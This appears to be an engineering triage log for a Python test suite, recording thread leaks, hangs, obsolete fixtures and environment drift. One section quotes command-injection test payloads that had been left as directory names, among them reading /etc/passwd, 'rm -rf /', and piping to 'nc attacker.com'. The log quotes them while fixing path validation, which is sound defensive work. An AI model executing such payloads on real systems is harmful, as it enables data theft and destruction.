# Test suite triage — 2026-07-31

Diagnostic pass over the test suite. Measured, not estimated. Nothing here was fixed by
guesswork or by weakening an assertion.

**Environment matters for reproducing any of this**: `conda activate emuses`. The env had drifted
badly from `requirements-dev.txt` — 47 packages the lockfile pins were simply absent. They are now
installed. Before that, a large share of "failures" were missing imports rather than defects.

## Method notes — traps that cost real time here

Recorded because each one was hit more than once, and each destroyed work that had already been
done.

**Measuring.** Never pipe a long or hanging pytest run to `tail`/`head` — when the process is killed
the pipe buffer goes with it and the only output is `Terminated`. Redirect to a file and read the
file. Two full-suite runs (50 min and 40 min) were lost this way. Likewise
`faulthandler.dump_traceback_later(..., exit=True)` never flushes a buffered Python file object:
pass a raw fd from `os.open()`. And `nohup ... &` inside an agent tool call does not outlive the
call; use the tool's own background mode.

**Attributing.** Four root causes asserted in earlier drafts of this document were wrong, all from
inferring a cause rather than capturing it:

- a hanging test identified by counting progress dots — the file named was merely slow (22s alone);
- leaked `_monitor` threads blamed on EMUSES's `ResourceMonitor` because of the name, when they were
  `logging.handlers.QueueListener._monitor` and `ResourceMonitor` was correct;
- core dumps attributed to the wrong directories before the fatal traceback was captured;
- an `EOFError` reported as a regression that does not reproduce (see §4).

Capture the cause directly: `threading.enumerate()` for a thread leak, the fatal traceback for a
crash, a single-file run for a suspected hang. Distinguish flaky from broken by repeating runs of
*unchanged* code before blaming an edit, and compare every claimed fix against a `git stash`
baseline.

**One more:** a requirements regex of `^([A-Za-z0-9_.\-]+)==` silently skips extras syntax, so
`coverage[toml]==` and `moto[s3]==` were reported as installed when they were not. Use
`^([A-Za-z0-9_.\-]+)(\[[^\]]+\])?==`.

## Fixed in this pass

**`test_circuit_breaker_opens_on_failures` no longer hangs.** It patched `client._session` before
`async with client`; `__aenter__` → `_ensure_session()` replaces the session when it is `None` or
`is_closed`, and a MagicMock's `.is_closed` is a truthy Mock — so the double was discarded, a real
`httpx.AsyncClient` was created, and requests to a dead `localhost:8000` looped through exponential
backoff forever. It also patched `.get` when `client.get()` delegates to `_session.request`. Fixed
by adopting the pattern the next test in the same file already used.
`tests/enhanced-cli-typer/test_service_client.py`: never terminated → 84s, 2 failed, 35 passed.

**47 missing packages installed** (`redis`, `hvac`, `google-cloud-storage`, `azure-storage-blob`,
`docker`, `authlib`, `testcontainers`, `pytest-cov`, `coverage`, `moto`, …). In `model_registry`
alone this took 74 failed / 620 passed → 65 failed / 645 passed, and cleared
`test_model_cache.py` entirely (12 failures, all `redis` absent).

## Open — needs real work

### 0. Flaky test (P3)

`tests/inference/test_simple_validation.py::TestSimpleNormalizationValidation::test_denormalization_scores_capability`
fails intermittently — 3 passes, 3 failures across six consecutive runs of identical code. Found
while checking whether the QueueListener fix had caused a regression; it had not. A flaky test is a
different problem from a broken one, and this one will corrupt any before/after comparison in
`tests/inference/` until it is fixed.

### 1. `tests/multi-user-service/` hangs as a directory (P2)

**Re-tested after the QueueListener fix: it still hangs** (420s cap). So it is a distinct cause,
not accumulating listener threads as originally suspected.

Every one of its 18 files passes or fails in ≤3s alone. Run together, the directory exceeds 900s,
stalling on `test_deployment_mode_integration.py` — which by itself finishes in 0.84s.

- No single pair reproduces it; a 9-file cumulative prefix does (>300s). So it is cumulative state,
  not one bad neighbour.
- Suspect, **unproven**: `test_deployment_mode_integration.py:90` sets `EMUSES_DATABASE_URL` to
  `postgresql://test:test@localhost/test`, a database that is not running, and the file builds
  `TestClient(app)`. Combined with engine/pool state left by earlier files, that could block.
- Next step: bisect the 9-file prefix further, then instrument with `faulthandler` to get the stack
  at the point of stall.

### 2. The 36× `assert 'error' == 'success'` cluster is obsolete tests, not broken code (P2)

36 of the 65 remaining `model_registry` failures share one assertion. `install_model()` returns
`{"status": "error"}` with `Invalid EMUSES folder: Not a complete EMUSES training folder`.

**The code is right and the tests are wrong.** ADR §2.1 (`.codebase-memory/adr.md`) states that a
complete EMUSES model is an entire output folder — UMAP, HDBSCAN, prediction pipelines, scalers,
metadata, trained together — and that components are *not* separable. It records that this was
"previously violated by a CompleteEmusesModel class" and that "that violation has been corrected".

The fixtures (e.g. `sklearn_model_dir` in `test_local_registry_real.py`) build a bare sklearn
`Pipeline` directory — a component. Validation correctly rejects it.

**Do not make the code accept these folders.** That would re-introduce the violation the ADR
records as corrected. The fix is to rebuild the fixtures as complete EMUSES folders — and per
guardrail G009, derived from a real EMUSES output folder rather than invented, so the fixture
actually reflects what the pipeline produces.

Affected: `test_local_registry_real.py` (8), `test_simplified_installation.py` (7),
`test_enhanced_schema.py` (7), `test_storage_optimization.py` (5), `test_hash_indexing.py` (5),
`test_enhanced_metadata_storage.py` (5), `test_concurrent_access.py` (5), and others.

### 2b. `--prefix` made a trained model unregisterable — FIXED 2026-08-06 (was P2, product bug)

Found while repairing the session fixture. Not a test defect — it affected real users.

`ModelIOManager._validate_emuses_folder_structure` (`model_io.py:730`) requires two files under
exactly these names:

```python
required_data = ["embeddings.npy", "input_matrix.npy"]
```

But the pipeline writes them with the run prefix applied:

- `umap_stage.py:74` — `f"{prefix}embeddings.npy"`
- `UMAP_utils.py:420` — `f"{pref}_input_matrix.npy" if pref else "input_matrix.npy"`

So a run with `--prefix myrun` produces `myrun_embeddings.npy` and `myrun_input_matrix.npy`, and
`install_model()` then rejects the folder with "Not a complete EMUSES training folder". Only
prefix-less runs can be registered. Confirmed by running the pipeline both ways: identical
configuration, `VALIDATES AS COMPLETE EMUSES FOLDER: False` with a prefix and `True` without.

The registry is right to check for the files; it was wrong to assume the default naming.

**Fix applied** in `_validate_emuses_folder_structure`, via a new `_resolve_artifact_prefix()` that
reads the prefix back from `log/arguments_*.json` — the pipeline saves its arguments there, and the
manifest does not record the prefix. The check still requires both arrays to exist; only their names
are resolved.

**Globbing `*embeddings.npy` would have been the wrong fix.** `test_embeddings.npy`,
`best_embeddings.npy` and `unlabeled_embeddings.npy` are all real EMUSES outputs and none is the
training embedding matrix, so a glob would accept a folder missing the actual training data.
`tests/model_registry/test_prefixed_model_validation.py` locks that in as a test.

This does **not** affect the 36 failures in item 2: those fixtures contain no embeddings at all.

### 2c. The suite littered the repo, and the security tests hid it — FIXED 2026-08-19

Nine directories were found **tracked in git**, each holding a `command.txt`:

```
`cat /etc/passwd`        $(whoami)_output          "output; rm -rf /"
"$(cat /etc/passwd)"     `malicious command`       'file | nc attacker.com'
'input && del C:\\Windows'  folder | nc attacker.com 80   output && del C:\Windows
```

Created 2026-07-31 by running `tests/enhanced-cli-typer/` from the repo root, committed in
`9327b6a` (branch-only, so a squash-merge of PR #5 keeps them out of `main`). A Windows checkout
would likely fail on those names outright.

Three separate defects, all fixed:

1. **The CLI created any directory it was handed.** `save_command_to_output_folder`
   (`emuses/cli/main.py`) calls `output_folder.mkdir(parents=True, exist_ok=True)` and was the
   *first statement* of `full()`. `validate_path` already existed in `emuses/cli/security.py` and
   was simply never applied to output folders. `validate_output_folder()` now runs at that single
   creation point — one guard covering all four commands rather than four call-site checks.
   Malicious paths exit 2 and create nothing; legitimate paths are untouched.
2. **The tests meant to catch this asserted nothing useful.**
   `test_typer_command_injection_prevention` and `test_argument_parsing_with_quotes` asserted
   `result.exit_code != 0 or "error" in result.output.lower()`, which passed because the command
   failed for an unrelated reason (missing input file / HTTP error) while the directory was still
   created. They would have passed with path validation deleted outright. They now assert the
   rejection specifically **and that nothing lands on disk** — the second assertion is the one with
   teeth. Confirmed by stashing the fix: 2 failed / 28 passed without it, 30 passed with it.
3. **Nothing isolated the filesystem.** 17 files use `CliRunner`; `isolated_filesystem()` appeared
   **zero** times. `tests/conftest.py` now has two autouse fixtures: `_isolate_cwd` runs every test
   in `tmp_path`, and `_no_repo_pollution` fails the session naming any new entry in the repo root.
   A test needing the real root opts in through the `repo_cwd` fixture.

Safe to apply globally, measured rather than assumed: no test refers to `test_data/` by bare
relative path (all derive from `PROJECT_ROOT` or `__file__`), and the four that touch the cwd either
manage it themselves or patch `Path.cwd`. `tests/cli` failure sets are byte-identical with and
without the change (19 failed / 58 passed either way).

**Residual, deliberately left alone**: `test_special_characters_in_arguments` in the same file
still uses the tolerant `exit_code != 0 or "error" in output` assertion. It is a weaker test than it
looks, but not a false-assurance case like the two above — its payloads go to `input_dataset`, not
the output folder, so nothing is created from them, and three of them (`file{expansion}.csv`,
`data[bracket].txt`, `file(parenthesis).csv`) are legitimate filenames that *should* be accepted.
Tightening it means first deciding whether input paths get the same validation as output paths,
which carries real compatibility risk. Not done here.

### 3. Slow-but-passing tests (P3)

Not broken, but they dominate runtime. `enhanced-cli-typer` alone:
`test_service_client.py` 84s, `test_performance_stress.py` 163s, `test_cli_integration.py` 51s,
`test_security_validation.py` 43s, `test_timeout_configuration.py` 39s.

Much of this is real retry/backoff delay being waited out. Injecting the backoff parameters, or
marking these `@pytest.mark.slow` and excluding them from the default run, would cut the suite
substantially.

Partly addressed on 2026-08-19: `test_performance_stress.py` now carries
`pytestmark = [pytest.mark.slow, pytest.mark.timeout(120)]`, so the `slow` marker `pytest.ini`
declares is finally used by something and `-m "not slow"` cuts the worst 163s. Note
`test_security_validation.py` dropped 43s → 20s for free once the CLI started rejecting malicious
output paths instead of taking them through the whole service-client path (§2c). The remaining
files are unmarked.

### 3b. `test_performance_stress.py` — hang not reproducible; net installed anyway (2026-08-19)

An orphaned run of this file from 2026-07-31 was found still alive on 2026-08-06, blocked in
`ep_poll` after **6 days 11 hours** — despite having been started with
`--timeout=20 --timeout-method=thread`. It was single-threaded by then, so pytest-timeout's watchdog
was already gone.

**The hang does not reproduce on current code.** The file runs to completion in ~163s, the process
exits cleanly, and nothing survives it. Stated plainly because it matters: the cause was not
identified. The most likely explanation is that the orphan was wedged in *interpreter shutdown*
rather than in a test body — a single thread in `ep_poll` with the watchdog already cancelled fits
teardown, not a running test — which points at the `atexit`/`QueueListener`/`mp.Queue` family fixed
in `b611686` and `a7b3283`. That cannot be proven retroactively and is not claimed as fact.

**Net installed regardless**, since the failure mode costs six days of a machine:
`pytest.ini` now sets `timeout = 600` with `timeout_method = thread` as a global floor, and the file
carries `pytestmark = [pytest.mark.slow, pytest.mark.timeout(120)]`. Verified with a probe test
blocked in `socket.accept()` — the orphan's exact signature — which pytest-timeout now kills.

**Both of the file's long-standing failures are fixed**, taking it from 2 failed/14 passed to
**16 passed**:

- `test_execution_time_comparison` divided the measured time by a hardcoded
  `simulated_legacy_time = 2.0` and asserted the ratio was `<= 2.1`. No legacy CLI was executed —
  it lives in `_archive_legacy` — so this was an absolute "finish within 4.2s" assertion dressed as
  a benchmark, and it failed on a busy machine (measured 3.09x). Removed; the absolute
  `new_cli_time < 10.0` assertion on the next line was doing the real work all along.
- `test_feature_parity_validation` failed with `KeyError: 'umap_trials'` because it asserted against
  the top level of the submitted payload. The payload is an envelope
  (`{job_name, description, pipeline_config}`) and the parameters live in `pipeline_config`.
  Verified against a real call that all six are forwarded correctly, so the CLI was right and the
  test was reading the wrong level.

### 3c. The service-spawn leak is real but the tests do not reach it (2026-08-19, verified)

Worth recording because it looks alarming and the obvious conclusion is wrong.

`emuses/cli/service_manager.py:236` spawns a **detached** uvicorn subprocess
(`start_new_session=True`), and its only cleanup is `atexit.register(self._cleanup_on_exit)` at
`:78`. `tests/conftest.py::mock_atexit_register` is autouse and swallows every `atexit.register`
during tests — the same fixture that silently broke the log-listener shutdown (§4). So on paper,
any test reaching that path leaks a uvicorn that outlives the run forever.

**Measured: the suite does not reach it.** Running the CLI tests produces no service-startup output
and leaves no `uvicorn` process or listening port behind. Invoking `_full_async` *outside* pytest
does start a real service — and shuts it down cleanly on exit, because `atexit` is not mocked there.

So the landmine exists but is not currently armed by the test suite. `mock_atexit_register` is
**left alone** on that basis. If a future test does reach the spawn path, this is the first thing to
check.

### 4. Leaked QueueListener threads abort the interpreter — FIXED 2026-07-31 (was P1)

**One root cause behind five directories, including all three core dumps.** Confirmed by capturing
the crash:

```
Fatal Python error: _enter_buffered_busy: could not acquire lock for
<_io.BufferedWriter name='<stderr>'> at interpreter shutdown,
possibly due to daemon threads
Exception in thread Thread-1 (_monitor)   [also Thread-2, -4, -6, -7]
```

**The tests pass first.** `tests/flexible-inference-stage/test_explicit_validation_flag.py` reports
`1 failed, 3 passed in 6.61s` and *then* the process aborts with exit code 134 (SIGABRT). So results
are correct but the exit status is a crash — which any CI system reads as failure. This is why
several directories reported "dumped core" while apparently having run fine.

**Mechanism**: `_monitor` is `logging.handlers.QueueListener._monitor` from the standard library —
**not** EMUSES's own `ResourceMonitor`, which an earlier draft of this document wrongly blamed.
(`ResourceMonitor.stop_monitoring()` is correct: it sets its stop event and joins with a timeout.)

`PipelineConfig.__post_init__` calls `_configure_logging()`, which built a fresh
`QueueListener(LOG_QUEUE, ...)`, started it, and registered its own `atexit` handler — **on every
`PipelineConfig` instantiation**. The pre-existing guard only prevented duplicate `QueueHandler`s,
never duplicate listeners. Five `PipelineConfig` objects across one four-test file therefore left
five listener threads and five atexit handlers, all contending for stderr during finalisation.

A second, quieter consequence: multiple listeners draining a *single shared queue* compete for
records. Each record goes to whichever listener dequeues it first, so log output was being split
arbitrarily between them rather than duplicated — losing lines from any given handler. That is a
correctness bug in logging independent of the crash.

**Fix applied**: a module-level `_LOG_LISTENER` singleton in `emuses/pipelines/pipeline_config.py`.
The listener and its atexit registration happen once.

**Verified** against a stashed comparison rather than assumed:

| Directory | Before | After |
|---|---|---|
| `flexible-inference-stage` | core dump, exit 134 | exit 1 — 6 failed, 9 passed |
| `pipelines` | core dump | exit 1 — 12 failed, 82 passed |
| `foundation_fastapi_service` | core dump | exit 1 — 32 failed, 171 passed |
| `integration` | thread traceback, no summary | exit 1 — 1 failed, 115 passed |
| `cli` | thread traceback | exit 1 — 19 failed, 58 passed (counts identical with/without) |
| `inference` | thread traceback | exit 1 — 16 failed, 40 passed |

`dev_test_runner.py` remained 13/13 throughout.

**Residual `EOFError` at shutdown — also FIXED 2026-08-06.** One traceback survived the singleton
change. The listener blocked in `mp.Queue.get()` and multiprocessing closed the pipe before anything
stopped it:

```
Exception in thread Thread-1 (_monitor):
  logging/handlers.py:1573 in _monitor    -> record = self.dequeue(True)
  multiprocessing/connection.py:399 _recv -> raise EOFError
```

The real cause was not ordering in the abstract — the registration never happened at all under test.
`tests/conftest.py::mock_atexit_register` is an **autouse** fixture patching `atexit.register` for
every test, so `atexit.register(_LOG_LISTENER.stop)` was captured by the mock and discarded.

Fixed by registering through `multiprocessing.util.Finalize(None, _stop_log_listener,
exitpriority=20)` instead. `LOG_QUEUE` registers its own close at `exitpriority=10` and finalizers
run in descending order, so the listener stops first; and multiprocessing installs its `atexit` hook
at import, before any test can patch it. Verified absent by the same `threading.excepthook` capture
that found it, with `tests/inference`, `tests/flexible-inference-stage` and `tests/pipelines` all
holding their recorded counts and reporting zero `Exception in thread` on stderr.

Note on how this was nearly missed: an earlier revision of this document retracted the EOFError as
"does not reproduce", based on grepping stderr across repeat runs and finding zero occurrences.
That measurement was invalid — shutdown truncates the traceback mid-write, so the string `EOFError`
never reaches stderr at all, and grep cannot find what was never written. Captured properly by
installing a `threading.excepthook` that writes to a raw fd. Second worked example of the attribution
trap at the top of this file, and this time the trap caught the retraction rather than the claim.

**Reproducer** — proves the leak directly rather than inferring it from the crash text. Five threads
survive a four-test file:

```bash
python -c "
import threading, pytest
code = pytest.main(['tests/flexible-inference-stage/test_explicit_validation_flag.py','-q','--tb=no'])
alive = [t for t in threading.enumerate() if t is not threading.main_thread()]
print('pytest exit code:', code)
print('threads still alive:', len(alive))
for t in alive: print(f'   {t.name!r} daemon={t.daemon} alive={t.is_alive()}')
"
```

```
pytest exit code: 1                      <- tests completed, 1 failed 3 passed
threads still alive: 6
   'Thread-1 (_monitor)' daemon=True alive=True
   'Thread-2 (_monitor)' daemon=True alive=True
   'Thread-4 (_monitor)' daemon=True alive=True
   'Thread-6 (_monitor)' daemon=True alive=True
   'Thread-7 (_monitor)' daemon=True alive=True
   'QueueFeederThread'   daemon=True alive=True
```

Use this to verify any fix: after it, the `_monitor` entries should be gone and the process should
exit with pytest's own code rather than 134.

### 4b. `test_bcrypt_password_hashing` is flaky under load, not failing (P3, 2026-08-19)

Carried over from `unfixed_test_analysis.md` before that file was deleted — **with its diagnosis
corrected**. That note described the test as expecting "bcrypt hashing to complete in < 0.5 seconds"
against an actual 0.73 s. That is not what it asserts. The assertion
(`tests/security/test_encryption_data_protection.py`) is a timing-attack-resistance check:

```python
time_ratio = abs(correct_time - incorrect_time) / max(correct_time, incorrect_time)
assert time_ratio < 0.5  # Allow some variance
```

It compares two `bcrypt.checkpw` calls against each other. The 0.73 in the old baseline was that
*ratio*, not a duration. Nothing is being held to a wall-clock budget.

The test passes on a quiet machine (verified 2026-08-19, 4.69 s). It fails when scheduler noise
makes two ~250 ms operations differ by more than half their maximum, which is why it appeared in a
run taken while swap was full. So it belongs with the flaky tests in item 0, not with real failures.

A ratio comparison of two short wall-clock samples cannot distinguish a timing side-channel from
ordinary scheduling jitter. If it is worth keeping, it needs repeated trials and a comparison of
medians; the current form will keep producing occasional red.

### 5. Two multi-user test directories (P4)

`tests/multi-user-service/` and `tests/multi_user_service/` both exist with different contents.
Probably unintended.

### 6. `subprocess` use inside tests (P3)

Six files under `tests/enhanced-cli-typer/` invoke `subprocess`. `CLAUDE.md` states: "Never run
`subprocess.run(["pytest", ...])` from within test files." Worth auditing which of those spawn
pytest specifically, since that both slows runs and escapes `pytest-timeout`.

### 7. The local env has drifted from the lockfiles again (P3, observed 2026-08-19)

88 of the pins in `requirements-dev.txt` do not match what is installed locally — mostly patch-level
(`anyio` 4.9.0 pinned / 4.11.0 installed) but not all: `fastapi-users` is pinned at 15.0.4 with
**14.0.1** installed, a major version behind, and `fastapi` 0.116.1 pinned / 0.118.0 installed.

This means **local green does not imply CI green**, in either direction, and every count in this
file is a measurement of the local environment rather than of the pinned one. Not acted on here.
Re-pin or re-sync deliberately, rather than as a side effect of some other change.

Found while adding `pytest-timeout` to `requirements-dev.in` — it was installed locally but declared
nowhere, so `pytest.ini`'s new `timeout = 600` would have been silently ignored on CI. Same shape as
the undeclared `aiosqlite` found earlier: the environment quietly had something the lockfile did not.

### 8. The pre-push gate was testing the wrong environment — FIXED 2026-08-19

`scripts/dev_test_runner.py` ran bare `python` and `pytest` through `shell=True`, so it used
whatever came first on `PATH`. On this machine that is **miniforge3, Python 3.12, pytest 9.0.2** —
not the project's `emuses` env (miniconda3, Python 3.11, pytest 8.4.2) that the test suite actually
runs in.

So the gate everyone is told to trust before pushing ("Pre-push: `python scripts/dev_test_runner.py`"
in `CLAUDE.md`) was validating a different interpreter, a different pytest major version, and a
different set of installed packages — while reporting a reassuring 13/13 throughout all of the work
in this document.

Caught by accident: after adding `timeout = 600` to `pytest.ini`, the gate emitted
`PytestConfigWarning: Unknown config option: timeout` from a `miniforge3/lib/python3.12` path. The
warning was the only visible symptom, and only because `pytest-timeout` is absent from that
installation.

Fixed by running `sys.executable -m pytest` / `-m py_compile` instead of bare names. Both
environments happen to pass 13/13, so nothing was being hidden — but that was luck, not design.

## Measured failure counts (post-dependency-install)

| Area | Result |
|---|---|
| `model_registry` | 61 failed, 656 passed, 7 skipped, 3 errors — 36 are the ADR cluster above |
| `multi-user-service` | 52 failed across 5 files; directory hangs |
| `enhanced-cli-typer` | ~11 failed; no longer hangs |
| `observability` | 9 failed, 52 passed |
| `deployment` | 7 failed, 49 passed |
| `analysis_api`, `cicd-pipeline` | 3 failed each |
| `security`, `unit`, `compliance` | 1 failed each |
| `tools`, `performance` | all pass |

Counts for areas other than `model_registry` predate the dependency install and will be lower now.
Re-measure before acting on them.

The `model_registry` line above was recorded as "65 failed, 645 passed" and re-measured on
2026-08-06 as **61 failed, 649 passed** on identical code — so four of the documented failures were
not reproducible. 656 passed once the 7 new prefix-validation tests are included. Treat every count
in this file as a claim needing re-measurement, not a fact: comparing a fix against a written-down
baseline rather than a freshly measured one would have credited the prefix fix with clearing four
failures it had nothing to do with.
